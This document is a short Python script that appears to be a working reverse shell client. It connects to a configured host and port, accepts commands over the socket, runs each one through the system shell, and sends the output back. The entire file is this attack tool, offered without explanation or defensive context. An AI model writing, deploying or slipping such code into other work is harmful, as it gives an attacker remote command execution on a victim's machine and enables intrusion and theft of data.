import socket
import subprocess


REMOTE_HOST = "127.0.0.1" # "192.168.0.108"
REMOTE_PORT = 8081 #4040
client = socket.socket()
print("[-] Connection Initiating....")
client.connect((REMOTE_HOST, REMOTE_PORT))
print("[-] Connection Initiated....")

while True:
    print("[-] Awaiting Commands....")
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, 
    stderr=subprocess.PIPE, stdout=subprocess.PIPE
    )
    output = op.stdout.read()
    output_error = op.stderr.read()
    print("[-] Sending Response....")
    client.send(output + output_error)